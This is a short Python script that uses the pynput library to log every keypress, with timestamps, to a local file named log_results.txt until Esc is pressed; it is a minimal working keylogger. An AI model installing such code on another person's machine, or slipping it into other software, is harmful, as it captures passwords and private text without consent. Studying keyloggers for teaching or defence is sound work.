from pynput.keyboard import Key, Listener
import logging
import sys

log_directory = ""
logging.basicConfig(filename = (log_directory + "log_results.txt"), level = logging.DEBUG, format = '%(asctime)s : %(message)s')

def keypress(Key):
    if str(Key) == "Key.esc":
        sys.exit()
    logging.info(str(Key))

with Listener(on_press = keypress) as listener:
        listener.join()